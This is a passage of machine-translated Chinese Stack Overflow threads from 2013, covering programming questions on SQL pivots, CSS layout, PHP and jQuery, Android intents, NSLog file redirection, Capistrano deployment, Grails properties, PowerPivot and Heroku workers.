> 
> 时间：2013-05-25T20:44:40.087

1.  2141391875 (0x7fa30c03) 是 NV12 肾上腺素平铺（又名 HAL_PIXEL_FORMAT_NV12_ADRENO_TILED，又名 HAL_PIXEL_FORMAT_YCbCr_420_SP_TILED）。这种颜色格式具有像素数据排序的最佳硬件处理方式。
2.  模拟器中的图片高度也不是 192。请注意：上面写着“crop-bottom=179”。这意味着高度实际上是相同的（180）。
3.  114688 字节是缓冲区的合适大小。以这种方式计算 = slice-height(192) * stride(384) * 1.5 并与 8K 对齐。
4.  INFO_OUTPUT_FORMAT_CHANGED 和 INFO_OUTPUT_BUFFERS_CHANGED 有不同的意义，那些顺序无关紧要。

仍然没有问题，一切看起来都很好。

# sql-server - 如何使用存储在列而不是行中的数据创建表？

> ID：15650070
> 
> 赞同：-1
> 
> 时间：2013-03-27T00:43:05.310
> 
> 标签：sql-server

我有一个包含 3 列的表：商店 ID、产品类型、产品数量，如下所示：

```
store1 shirt 3
store1 hat   2
store2 shirt 1
store3 hat   4 
```

我想将此表转换为以下格式（第 2 列中的衬衫数量和第 3 列中的帽子数量）：

```
store1 3 2
store2 1 -
store3 - 4 
```

我该如何写我的`select`声明来做到这一点？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:18:14.033

在行上尝试多个聚合：

```
SELECT store, Sum(CASE WHEN product='shirt' THEN quantity ELSE 0 END) AS shirts,
    Sum(CASE WHEN product='hat' THEN quantity ELSE 0 END) AS hats
FROM YourTable
GROUP BY store 
```

如果这不是您的意思，您将不得不提供更多信息。

# labview - 快速了解复杂 LabView VI 工作原理的最有效方法是什么？

> ID：15650071
> 
> 赞同：0
> 
> 时间：2013-03-27T00:43:06.653
> 
> 标签：labview, joystick, motordriver

了解控制[电机](http://www.ebay.com/itm/ws/eBayISAPI.dll?ViewItem&item=110875380083)的复杂 LabView VI 的最佳方法是什么？

我的目标是通过[操纵杆](http://www.saitek.com/manuals/x52_manual.pdf)控制电机。

下面显示的接线图允许 LabView 用户从 LabView GUI 控制电机：上下移动滑块以增加或减少所需的速度。随着滑块值的变化，它被输入到一堆数学控件中，最终被转换成一个命令字符串供电机解释。如果我理解正确，这个命令字符串是写入串行端口的一堆字节。

我不想使用 LabView GUI 来控制电机，而是使用操纵杆。

解决这个问题的最佳方法是什么？

操纵杆有俯仰、偏航、滚动和油门。哪一个与电机的速度最相关？

![在此处输入图像描述](../Images/25abda5211067fb43e2959d10371383a.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T09:56:42.333

标题“快速了解复杂 LabView VI 工作原理的最有效方法是什么？”的答案是什么？可能是做以下的一些组合：

*   查看 VI 的输入和输出以尝试了解它们的用途。控件和指示器的标签和标题可能会有所帮助，也可以右键单击以查看说明和提示。
*   除了控件和指示器之外，还要查找其他 I/O：队列、通知器、全局变量、文件读/写、仪器通信以及在调用之间持续存在的任何数据存储，例如未初始化的移位寄存器。
*   查看 VI 的整体结构以了解它是如何执行的，例如，它是一次性操作吗，它是否根据某些输入执行不同的情况，它是否循环直到某个条件发生，它是否使用状态机结构， ETC
*   将 VI 的结构分解成您可以理解的更小的部分。您可以将图表打印出来并手动注释，或者在图表中添加框架装饰和文本注释以记录您的推论。如果图表杂乱或布局不佳，请在进行时重新排列（使用 Ctrl 键单击并在图表背景上拖动以在需要的地方添加空白区域）。
*   在关键线路上设置探针并在 VI 运行时观察它们，看看会发生什么
*   如果可能，手动将 VI 的控件设置为示例值并运行它以查看会发生什么（如果 VI 依赖于同时运行的程序的其他部分，这可能不起作用）
*   编写一个调用复杂 VI 的测试包装 VI，并为其提供示例数据或输入以查看会发生什么。

为了解决您发布的 VI 图的具体问题，我可以看到各种数量的控件，例如速度、位置、幅度、最大 A（幅度？）、频率等。您需要决定哪些量应该由操纵杆的哪个轴或输出来控制。然后，您需要添加从操纵杆读取这些值的代码，并修改现有代码，以便您要控制的参数由操纵杆值提供，而不是由前面板控件提供。您可能只需将操纵杆读取代码放在现有循环中，将操纵杆输出连接到要替换的前面板控件的电线，然后将相关的前面板控件更改为右键单击菜单中的指示器这样它们就会显示您从操纵杆获得的值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-28T16:49:10.507

我对您的第三个问题的回答是“油门”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T08:34:17.617

最好的方法是从头开始写一个。但是您可以通过单击突出显示执行按钮来分析代码，以在运行 VI 时显示程序框图执行的动画，并使用探针检查中间值。您可能还应该参加在线课程，例如[LabVIEW 培训：在三或六小时内学习 LabVIEW](http://www.ni.com/white-paper/5247/en)

# ruby - 在 ruby 上使用 google_drive gem 在 google 电子表格中设置单元格或行背景颜色

> ID：15650078
> 
> 赞同：4
> 
> 时间：2013-03-27T00:44:00.970
> 
> 标签：ruby, gem, spreadsheet, google-drive-api, google-drive-realtime-api

我正在尝试为单元格和行设置背景颜色，并且正在使用“google_drive”gem。看起来“电子表格”宝石确实有这个选项

```
format = Spreadsheet::Format.new :color=> :blue, :pattern_fg_color => :yellow, :pattern => 1 
```

如果 'google_drive' gem 也有这个选项，请告诉我！

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-10-01T21:10:43.450

问题是您试图通过设置来设置背景颜色`:color => :blue`。相反，设置`:pattern_bg_color => :blue`.

所有选项： `:bottom_color, :top_color, :left_color, :right_color, :pattern_fg_color, :pattern_bg_color, :diagonal_color`

希望这可以帮助！

# css - CSS - 图片和页脚问题

> ID：15650081
> 
> 赞同：0
> 
> 时间：2013-03-27T00:44:45.420
> 
> 标签：css, image, footer

好的，如果你去这里： [http ://opportunityfinance.net/Test/2013conf/index.html](http://opportunityfinance.net/Test/2013conf/index.html)

您会注意到 2 个布局问题

![问题 1 - 图片必须低于 GOLD](../Images/559594771dd38108851ec569e88477d4.png)

3 个徽标的此图像需要位于“Gold”`<h4>`标签下方。但由于某种原因，它不会这样做。我已经为`<div>`标签分配了一个位置，`relative`因为其中还有其他 div 需要将图像与底部对齐，并且这样做正确，但是，它现在不会低于`<h4>Gold</h4>`HTML。

下一个布局问题：

![页脚正在切断正文内容](../Images/375bc9cbaf15ff619028616e2c9fad82.png)

我一直在努力在页面底部找到页脚。听起来很简单吧？错误的！但是现在我让 div 位于底部，它似乎正在切断它上方的顶部区域 div。因此，并非所有内容都在显示。相反，它被推到页脚下方。我怎样才能解决这个问题？试图在上面加一个填充，但现在确定在哪里和/或如何？页脚上的 margin-top 似乎也没有做任何事情。

非常感谢您对此的任何帮助。为了让这个简单的布局井井有条，我一直在苦苦挣扎。它应该是一个流畅的布局，因为我也在调整页面大小时缩小文本的大小，这似乎非常好，除了这两个问题:(

***编辑***

这是将容器 div 应用 100 像素高度值时的样子：

![高度为 100 像素的 div](../Images/fc36697028bfa9ef0ddb3851b4d2a81e.png)

`<h4>Gold</h4>`它在 the和 3 图像之间提供了太多空间。至少在 Opera 中是这样的。任何可能的解决方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:53:28.347

这是一个修复

```
.body {
    background-color: #FFFFFF;
    padding: 2em 2em 52px 0;
} 
```

您在一个 div 中有 3 个徽标，在该 div 上添加一个高度，例如

```
element.style {
    height: 100px;
    position: relative;
    width: 100%;
} 
```

非常基本的东西，你应该看看`clearfix's`这里[http://css-tricks.com/snippets/css/clear-fix/](http://css-tricks.com/snippets/css/clear-fix/)

当您将`float`or添加`position:absolute;`到 div 时，它会以某种方式放弃其`reserved`空间，从而导致父母`div`认为里面没有任何东西，因此没有`height`，`clearfix`将为您解决这些问题，我说的原因是因为 3 个徽标是要么`floated`要么`absolute;`

这是`result`我得到的

![在此处输入图像描述](../Images/3d10be344c742207374ed9a9f084d3ea.png)

# php - 停止跳转到页面顶部

> ID：15650084
> 
> 赞同：0
> 
> 时间：2013-03-27T00:45:00.767
> 
> 标签：php, hyperlink, href

当我点击一个链接时，有任何方法可以防止页面停止跳转到页面顶部，我的链接如下所示：

```
 echo "<a href=\"$_SERVER[PHP_SELF]?action=remove&key=$nameskey\">Remove</a>"; 
```

当我想从列表中删除条目时单击此链接，

我只使用 PHP。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:51:31.610

您可以在链接中使用 ajax 或命名锚点，以便在重新加载时将用户返回页面。

命名锚：[带有“名称”或“ID”的 HTML 锚？](https://stackoverflow.com/questions/484719/html-anchors-with-name-or-id)

Ajax 方法（许多选项之一）：[http ://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T00:53:01.600

立即删除此代码。[这篇文章](http://blog.mischel.com/2008/08/08/hey-you-deleted-my-files/)给出了一个原因。`GET`请求永远不应该修改服务器上的任何东西，尤其是不要删除。

相反，您应该考虑使用 AJAX。例如：

```
echo "<a href=\"javascript:remove(this,'".$nameskey."');\">Remove</a>"; 
```

和：

```
<script type="text/javascript">
    function remove(link,key) {
        var a = new XMLHttpRequest();
        a.open("POST","delete.php",true);
        a.onreadystatechange = function() {
            if( this.readyState == 4 && this.status == 200) {
                // assuming the link is a direct child of the element to be removed
                link.parentNode.parentNode.removeChild(link.parentNode);
            }
        };
        a.send("action=remove&key="+key);
    }
</script> 
```

# css - 如何在绝对位置和相对位置之间对齐 div

> ID：15650089
> 
> 赞同：1
> 
> 时间：2013-03-27T00:45:45.673
> 
> 标签：css, html, position, alignment, center

我有 3 个 div。第一个 div 在顶部，位置相对，第二个 div 在底部，它的位置是绝对的。还有第三个 div，我希望它位于中间。我希望第三个 div 位于中间，这样无论我更改浏览器的高度，我都希望它与 20px 填充对齐，具体取决于第一个和第二个。

```
middle-box{
padding: 20px;
}

.top-box{
width: 265px;
position: relative;
margin: 0px auto;
}

.bottom-box{
width: 25%;
padding: 12px 0 12px;
position: absolute;
bottom: 0px;
min-width: 300px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:08:21.530

如果您选择将底框“卡”在浏览器窗口的底部，您的中间框和底框之间将有一个可变空间，具体取决于中间框中的内容量和查看器的浏览器窗口的大小。如果您希望 div 之间的间距保持一致，则需要删除绝对定位。

另外，我强烈建议将您的 css 从类更改为 ids（。到 #）。您忘记了中间框中的 class/id 标记，因此这也可能导致问题。

请记住，padding 会影响 div 的内部，而 margin 会影响外部。

此代码是否为您提供了您正在寻找的东西？（我添加背景颜色只是为了视觉效果，这样我就可以看到 div 发生了什么。）

```
<style type="text/css">
#top-box {
    width: 265px;
    position: relative;
    margin: 0px auto;
    background-color: #DDD;
}
#middle-box{
    margin: 20px 0;
    padding: 20px;
    background-color: #AAA;
}
#bottom-box{
    width: 25%;
    padding: 12px 0 12px;
    bottom: 0px;
    min-width: 300px;
    background-color: #888;
}
</style>
</head>
<body>
<div id="top-box">something in the top goes here</div>
<div id="middle-box">something in the middle here.</div>
<div id="bottom-box">something at the bottom.</div>
</body> 
```

如果不知道你打算用这些 div 做什么，很难知道还能告诉你什么。希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:07:37.027

关于这个问题的变体已经在 SO 上被问了几十次。您想要 20px 边距的事实是无关紧要的。整体结构可能很棘手。

我认为这符合您的要求。您可能必须做出的一种妥协是在页眉和页脚上设置固定高度。

[http://jsfiddle.net/Fd6f9/1](http://jsfiddle.net/Fd6f9/1)

```
.top-box {
    height: 60px;
    position: relative;
}
.middle-box {
    position: absolute;
    top: 70px;
    bottom: 80px;
    left: 20px;
    right: 20px;
    margin: 20px 0;
}
.bottom-box {
    height: 56px;
    padding: 12px 0 12px;
    position: absolute;
    bottom: 0px;
} 
```

# android - 当以相同的意图重新启动活动时如何避免重复处理

> ID：15650090
> 
> 赞同：3
> 
> 时间：2013-03-27T00:45:46.347
> 
> 标签：android, android-intent, android-activity

我们的活动可以从 GCM 通知启动。我们在 GCM 意图中设置了 extras，以确保将用户带到该 GCM 通知的消息线程，然后我们调用`removeExtra`以将其从意图中删除。

如果用户从最近的历史菜单启动我们的应用程序，那么该活动将以与上次启动相同的意图启动（例如，从 GCM 通知）。

这种情况很容易检测到：

```
 Intent i = getIntent();

    // If the caller intent is from the recent apps and has the RECIPIENT_ID_KEY
    // extra we should remove it to avoid open the messages thread again
    if (((i.getFlags() & Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY) != 0) &&
             i.hasExtra(MyConstants.RECIPIENT_ID_KEY)) {
        i.removeExtra(MyConstants.RECIPIENT_ID_KEY);
    } 
```

但是，如果活动已被操作系统破坏，我们也希望它能够工作。目前，当设置了开发人员选项“不保留活动”（仅在 OS 4.0+ 上可用）时，当从我们的另一个屏幕按下后退按钮时，活动会继续以相同的意图重新创建，从而导致错误发生的事情。

我考虑在我们的 GCM 意图中添加一个独特的额外内容，并在我们处理它后将其保存在共享首选项中。`SEND image/jpg`但是，当通过意图将图像共享到我们的应用程序时，我们也需要这样做。我们不控制那个意图，那么我们怎么知道我们是否已经处理了它？我想我们可以使用文件/URI 信息，尽管这意味着如果用户连续两次共享同一个图像，我们将忽略第二个。

有没有一种干净简单的方法来解决这个问题？

我们目前支持 OS 2.3+，我们的应用程序在世界各地都可用。这是我的 AndroidManifest.xml 的相关部分：

```
 <activity
        android:name=".ui.MyClass"
        android:configChanges="orientation|screenSize"
        android:launchMode="singleTop"
        android:windowSoftInputMode="stateHidden" > 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-08-30T23:58:47.030

我对如何解决这部分感兴趣：

> 但是，当通过 SEND image/jpg intent 将图像共享到我们的应用程序时，我们也需要此功能。

一旦我处理了图像，我就会在 Intent 上放置一个额外的标志。你可以想象，我在处理文件之前检查了那个标志。即使 Intent 是由另一个应用程序创建的，这也有效。

# objective-c - 如何将某些 NSLog 输出重定向到文件

> ID：15650093
> 
> 赞同：1
> 
> 时间：2013-03-27T00:46:23.917
> 
> 标签：objective-c, xcode, nslog

我正在使用代码将所有 NSLogs 写入文本文件。如何选择只需要写入文件的 NSlog？

```
 NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                     NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *logPath = [documentsDirectory stringByAppendingPathComponent:@"MOVbandlog.txt"];
//freopen([logPath cStringUsingEncoding:NSASCIIStringEncoding],"a+",stderr);
freopen([logPath fileSystemRepresentation],"a+",stderr); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T06:29:07.180

您可能想看看[Lumberjack](https://github.com/robbiehanson/CocoaLumberjack)，它是一个全面的日志库。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-06-15T09:22:08.767

请看看这可能会有所帮助：

当设备未连接到系统时，将 nslog 输出重定向到文件在场景中很有用，我们需要控制台日志来跟踪一些问题。为了做到这一点，我们添加了一个 NSObject 的单格类 USTLogger 子类：

USTLogger.h 文件的源代码如下：

```
#import <Foundation/Foundation.h>

@interface USTLogger : NSObject
{
BOOL stdErrRedirected;
}
@property (nonatomic, assign) BOOL stdErrRedirected;

-(void) writeNSLogToFile;

+ (USTLogger *) sharedInstance; 
```

USTLogger.m 文件的源代码如下：

```
#import "USTLogger.h"
#import <unistd.h>

@implementation USTLogger

@synthesize stdErrRedirected;

static int savedStdErr = 0;
static USTLogger *sharedInstance;

+ (USTLogger *) sharedInstance {
static dispatch_once_t once;
static id sharedInstance;
dispatch_once(&once, ^{
sharedInstance = [[self alloc] init];
});
return sharedInstance;
}

-(id)init {
return self;
}

- (void) writeNSLogToFile
{

if (!stdErrRedirected)
{
stdErrRedirected = YES;
savedStdErr = dup(STDERR_FILENO);

NSString *cachesDirectory =  [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)  objectAtIndex:0];
NSString *logPath = [cachesDirectory stringByAppendingPathComponent:@"nslog.log"];
freopen([logPath cStringUsingEncoding:NSASCIIStringEncoding], "a+", stderr);
}
}

- (void)restoreStdErr
{
if (stdErrRedirected)
{
stdErrRedirected = NO;
fflush(stderr);

dup2(savedStdErr, STDERR_FILENO);
close(savedStdErr);
savedStdErr = 0;
}
} 
```

USTLogger 类实现后，我们只需要在文件中需要 nslog 时调用这些方法

```
#import "AppDelegate.h"
#import "USTLogger.h"

@interface AppDelegate ()

@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
// Override point for customization after application launch.

[[USTLogger sharedInstance] writeNSLogToFile];

NSLog(@"didFinishLaunchingWithOptions");

return YES;
}
@end 
```

这会将整个 nslog 输出写入一个文件并存储在应用程序文档目录中，我们可以通过为应用程序启用文件共享来获取该 nslog 文件。

源代码可从以下链接下载：

[https://shankertiwari3.wordpress.com/2015/06/09/redirect-the-nslog-output-to-file-instead-of-console/](https://shankertiwari3.wordpress.com/2015/06/09/redirect-the-nslog-output-to-file-instead-of-console/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T00:48:54.527

您可以创建两个版本的 NSLog，因为仅使用 NSLog 的 MYLog 将显示在控制台上。第二个 MYLogFile 将调用 NSLog 并写入文件。

所以基本上你需要制作两个宏或方法。

# ruby-on-rails - 为什么视图代码不包含在类中？

> ID：15650098
> 
> 赞同：0
> 
> 时间：2013-03-27T00:46:39.807
> 
> 标签：ruby-on-rails, oop, class, model-view-controller

这是“为什么事情以某种方式工作”的问题之一。

由于 Rails 是一种纯面向对象的语言，控制器代码、模型代码、帮助代码、迁移代码等都封装在类中。但不查看代码。

所以我想知道：Rails 怎么知道视图代码属于[Active View 类](http://api.rubyonrails.org/classes/ActionView/Base.html)？这在内部如何运作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:50:05.190

所有 Ruby 文件都在一个类中运行，只需运行一个包含以下内容的文件：

```
puts self.class.name 
```

你会看到你的代码在`Object`执行时被包装在一个类中。

# wordpress - WordPress 自定义帖子类型和自定义模板

> ID：15650103
> 
> 赞同：0
> 
> 时间：2013-03-27T00:47:03.330
> 
> 标签：wordpress

我在 WordPress 3.5.1 上创建了我的自定义帖子类型

因此，在仪表板下，我在左侧看到了我的自定义帖子类型。所以，我在这个自定义类型下做了一个添加新的。

但是我没有看到任何可以为此自定义类型选择的模板页面。

我创建了一个名为 archive-customtype.php 的文件，它是一个模板页面，并放入我的主题文件夹中。

在较旧的 WordPress 上更改不同的模板，您执行

从页面属性元框中选择模板 > 自定义类型并发布页面。

所以我的问题是，在这个新的 3.5.1 上，我在哪里选择这个自定义帖子类型的模板？现在它使用的是默认的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-27T18:24:28.690

通过 iLocalize [http://wordpress.org/plugins/types/](http://wordpress.org/plugins/types/)安装自定义帖子类型插件。他们有很多关于如何将自定义帖子添加到页面的教程。本教程[http://youtu.be/1SXyHbgjYaI](http://youtu.be/1SXyHbgjYaI)这里是我找到的最好的，但还有更多 wp-types 网站。查找如何在 wordpress 上创建新的页面模板。org 并将教程中的代码放置到页面模板中。希望这可以帮助。

# php - 基于下拉显示/隐藏动态文本框

> ID：15650104
> 
> 赞同：-2
> 
> 时间：2013-03-27T00:47:05.503
> 
> 标签：php, jquery

我试图弄清楚如何让 jQuery 显示/隐藏基于下拉菜单选择的动态生成的文本框。我的 JS 技能非常有限。我在while循环中创建了以下内容，具体取决于人数：

```
<select name="location[<?=$pid?>]" id="location[<?=$pid?>]">
<option value="<?=$loc_id?>" selected><?=$loc_name?> </option>
<option value="Other">Other</option>
<option value="Other">--------</option>
<? $query_loc = mysqli_query($link, "SELECT * FROM locations WHERE loc_app = 'Y' ORDER BY loc_name ASC");
while($fetch_loc = mysqli_fetch_array($query_loc)){
     $loc_id = $fetch_loc['loc_id'];
     $loc_name = $fetch_loc['loc_name'];
     ?>
     <option value="<?=$loc_id?>"><?=$loc_name?></option>
     <?
}  ?>
</select>
<input name="location_other[<?=$pid?>]" type="text" id="location_other[<?=$pid?>]" style="display:none" /> 
```

jQuery函数：

```
<script type='text/javascript'>
$(window).load(function(){
    $('#location').change(function () { 
        if ($(this).val() == "Other") { 
            $('#location_other').show(); 
        } else { 
            $('#location_other').hide(); 
        } 
    }); 
});
</script> 
```

我需要保留 id 并使用 $pid 变量进行序列化以供以后处理。还有另一种方法可以在这些上调用 jquery 函数吗？

HTML 输出如下所示：

```
<select name="location[287]" id="location[287]">
        <option value="1" selected>A</option>
        <option value="Other">Other</option>
        <option value="Other">--------</option>
        <option value="12">B</option>
        <option value="12">C</option>            
      </select>
      <input name="location_other[287]" type="text" id="location_other[287]" style="display:none" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:50:26.497

尝试

```
$(window).load(function(){
    $('#location').change(function () {
        $('input[id^=location_other]').hide();
        if ($(this).val() == "Other") { 
            $('#location_other').show(); 
        } else { 
            $('#location_other' + $(this).val()).hide(); 
        } 
    }); 
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T09:02:56.983

尝试这个

```
<select name="location[287]" id="location[287]">
    <option value="Other">Other</option>
    <option value="one">One</option>
    <option value="two">Two</option>
    <option value="three">Three</option>
</select>
<input name="location_other[287]" type="text" id="location_other" style="display:none" />

<script type='text/javascript'>
    $(window).load(function() {
        if ($('select[id^="location"]').val() == "Other") {
            $('#location_other').show();
        } else {
            $('#location_other').hide();
        }

        $('select[id^="location"]').change(function() {
            if ($(this).val() == "Other") {
                $('#location_other').show();
            } else {
                $('#location_other').hide();
            }
        });
    });
</script> 
```

# c - 使nordic在不接收数据时表现不同

> ID：15650107
> 
> 赞同：1
> 
> 时间：2013-03-27T00:47:09.947
> 
> 标签：c, wifi

我正在寻找有关[北欧 wifi](https://www.sparkfun.com/products/8602)的帮助。

我得到纠正的情况是：

当 Nordic 接收数据时，由 allrandom 和 led_strip_color 方法激活的 LED 随机发光。

但是有一种情况，Nordic 没有收到任何数据，我不想在那段时间使用我的电源，我希望所有的 LED 都关闭 ///

```
 while(!(nrf24l01_irq_pin_active() && nrf24l01_irq_rx_dr_active())); 
```

上面的命令检查 nordic 是否处于活动状态并接收数据，但是当我停止发送数据时，无法执行其中提到的命令。

注释掉的部分是我尝试过的东西，但是我无法找到出路。

```
while (1) {
    nrf24l01_clear_flush(); // Clears the wifi cache

    nrf24l01_set_as_rx(true); // sets the wifi pin as high
    while(!(nrf24l01_irq_pin_active() && nrf24l01_irq_rx_dr_active())); //checks if it //inactive and loops in that state 
    /*{
    printf(" test nordic wait");
    led_strip_colors[0] = 0xFF0000;  // red // colors each led in led strip
    led_strip_colors[1] = 0;  // green
    led_strip_colors[2] = 0;  // green
    led_strip_colors[3] = 0;  // green
    led_strip_colors[4] = 0;  // green
    led_strip_colors[5] = 0;  // green
    led_strip_colors[6] = 0;  // green
    led_strip_colors[7] = 0;  // green
    led_strip_colors[8] = 0;  // green
    led_strip_colors[9] = 0;  // green
    led_strip_colors[10] = 0;  // green
     //ds_delay_uS(100);
      //for (n = 0; n < LED_STRIP_LEN; n++) { led_strip_colors[n] = 0; }

    }*/
    nrf24l01_read_rx_payload(rxdata, 32);// collects data in rxdata

    ping_count++;                  
    nrf24l01_irq_clear_all();
    printf("%s\n", rxdata);

    if ((ping_count % 10) == 0) {
      addRandom();  // helps to change color randomly
    }
    send_frame();   

    ds_delay_uS(130);
    int i;
    // Delay for 1 second
    for (i=0; i<10; i++) {
      ds_delay_uS(100);
    }
  }
} 
```

我有另一个北欧活动，它连续发送数据。任何帮助将不胜感激** *** 我正在尝试制作一个 GeoCacher，当它从钥匙扣接收数据时它会发光，这是它的一部分 ***

# capistrano - 使用 Capistrano 从远程服务器构建和部署

> ID：15650108
> 
> 赞同：2
> 
> 时间：2013-03-27T00:47:15.437
> 
> 标签：capistrano

我是 Capistrano 的新手，开始有点挣扎。简要说明我需要做什么：

*   `git pull`来自我们 git repo 的最新代码，位于中央构建服务器上。此构建服务器的环境与部署环境完全匹配。我需要在这里构建代码。例如，我不想部署在 Mac 笔记本电脑上构建的二进制文件。
*   在这台机器上编译二进制文件。
*   将它从这台机器部署到所有目标机器。
*   有一个共享用户，我们都可以在构建机器上通过 SSH 访问来进行构建。
*   构建机器位于网关机器后面，不能直接访问。
*   所有部署目标机器也有这个共享用户并且也在网关后面。
*   部署的二进制文件是单个可执行文件，目标机器上有一个初始化脚本。部署二进制文件并更改符号链接后，通过 init 脚本重新启动服务。
*   每个人都有适当的 SSH 密钥和代理转发来完成所有必要的任务。

所以原则上它看起来相当简单，但 Capistrano 似乎固执己见而且有点神奇。结果，我不确定如何完成所有这些。似乎它想检查我的代码并将其复制到远程机器上，例如不先构建它。

我想我需要忽略 Capistrano 的所有默认智能，并让它在适当的服务器上运行一些 shell 命令。在伪代码中：

*   `ssh buildmachine via gateway "cd repo && git pull && make"`
*   `ssh targetmachine(s) via gateway "scp buildmachine:repo/binary .; <mv && symlink>; service foo restart"`

我是否使用了正确的工具来完成这项工作？它看起来很像方孔中的圆钉。

有人可以向我解释 Capistrano 配置文件的内容应该是什么，以及`cap`我将运行哪些命令来完成此操作？

顺便说一句，我四处搜索并查看了诸如[使用远程 git repo 部署 capistrano 但没有在生产服务器上运行 git](https://stackoverflow.com/questions/1456275/deploying-with-capistrano-with-remote-git-repo-but-without-git-running-on-produc)以及[从服务器上手动拉取到 Capistrano 等问题](https://stackoverflow.com/questions/13199716/from-manual-pull-on-server-to-capistrano)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-24T07:11:44.843

这个问题相当古老，但你永远不知道什么时候有人踏上它需要信息......

首先，考虑到 Capistrano 可能不是您想做的工作的正确工具。

也就是说，实现您的期望并非不可能。在部署大量文件并修改它们的项目中（如 css/js 缩小、js 构建等）我会避免它，在您的情况下，您可以考虑运行“部署存储库”并在 capistrano 中将其配置为源. 您的流程如下所示：

*   使用您需要的任何工具运行本地构建
*   将生成的二进制文件上传到部署存储库
*   运行将连接到应用程序服务器的 capistrano，从存储库中获取新的二进制文件，执行所需的任何服务器端任务并符号链接到“当前”

作为副作用，您最终会获得已部署二进制文件的完整历史记录

# grails - 如何访问从命令行传递到 grails 的配置变量

> ID：15650109
> 
> 赞同：0
> 
> 时间：2013-03-27T00:47:24.837
> 
> 标签：grails

我正在尝试通过类似于以下的命令行将变量发送到我的 grails 应用程序：

```
grails -Dmy.build.number=33 prod war ROOT.war 
```

我试图访问它，`grailsApplication.config.my.build.number`但我得到一张空地图。变量已定义但未设置为我发送的内容似乎很奇怪。

如何访问命令行属性？

我计划将我的一些资产（css、js、图像等）放在云端以充当 cdn。所以在我的构建阶段，我想使用构建号作为缓存破坏器并将我的资产设置为指向`mycloudfronturl/assets/${buildnumber}/script.js`. 如果有更好的方法，我也愿意接受。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T00:57:24.573

```
System.getProperty("my.build.number"); 
```

# excel - 如何让 Excel Pivot 'Summarize by' 返回实际数据值而不是 sum、avg 等？

> ID：15650112
> 
> 赞同：0
> 
> 时间：2013-03-27T00:47:29.187
> 
> 标签：excel, powerpivot, summarization

我将 Excel Powerpivot 与两个单独表中的数据一起使用。表 1 包含具有 BRAND 特征的 ITEM 级别数据。表 2 有 BRAND 级别的数据。这两个表由 BRAND 键链接。我使用的度量是不可添加的。即项目的总和不等于品牌。枢轴设置为嵌套在行中的 BRANDS 下和列中的 Measure 下的 ITEMS。

Excel 假定我想通过应用 SUM、MAX、MIN、AVG 等将 ITEM 汇总到 BRAND 级别。我想从相应的 ITEM 或 BRAND 级别表中返回实际值，而不对这些值应用任何计算。这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:21:23.700

如果您有效地尝试做的是为 Brand 行产生不同的结果（例如 blank()），那么答案是编写一个进一步的度量来进行逻辑检查以确定所讨论的行是 ITEM 还是一个品牌。

```
= IF (HASONEVALUE(table1[Item]), [Measure], Blank() ) 
```

请记住，这将适用于您当前的支点，但可能不适用于所有支点。

这假设您已经明确创建了一个名为 [Measure] 的度量，并且您不只是将数字列拖到值框中。如果不是，您可以创建如下的初始 [Measure]：

```
= Sum(table1[Value]) 
```

其中 Value 是要在度量中使用的列。尽管您使用了总和，但如果它与表中具有单行的单个项目相关，它将给出所需的结果。

# java - 如何在 Heroku 上生成多个 worker 并将它们绑定到非 Web Java 应用程序

> ID：15650117
> 
> 赞同：0
> 
> 时间：2013-03-27T00:47:58.943
> 
> 标签：java, heroku, worker

我尝试使用[本教程](https://devcenter.heroku.com/articles/run-non-web-java-processes-on-heroku.)在 Heroku Server 上生成两个 worker。

但是基于这个例子，我只有一个工人同时运行。是否可以在应用程序启动时生成 2 个运行 2 个不同作业的工作人员？

我已经尝试通过使用来扩展工人：`heroku ps:scale worker=2`. 但是当我这样做时，它只会影响 WorkerProcess 类，并且我有两个 WorkerProcess 类同时运行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T06:12:42.220

是的，您可以拥有任意数量的工作进程。它们只需要在您的 Procfile 中有不同的名称。在您引用的文章中，单个工作人员只是被称为`worker`，但是您的 Procfile 可能看起来像这样，有两个不同的工作人员被称为`updater`and `mailer`：

```
web: java -jar web-app.jar $PORT
updater: sh worker/target/bin/updater
mailer: sh worker/target/bin/mailer 
```

如果您使用本文中`appassembler-maven-plugin`显示的内容，您还需要`<program>...</program>`为每个工作人员添加另一个元素，以便生成必要的启动脚本。

# elasticsearch - 您可以在定义查询表达式后引用和过滤查询表达式中的脚本字段吗？

> ID：15650118
> 
> 赞同：6
> 
> 时间：2013-03-27T00:48:01.623
> 
> 标签：elasticsearch

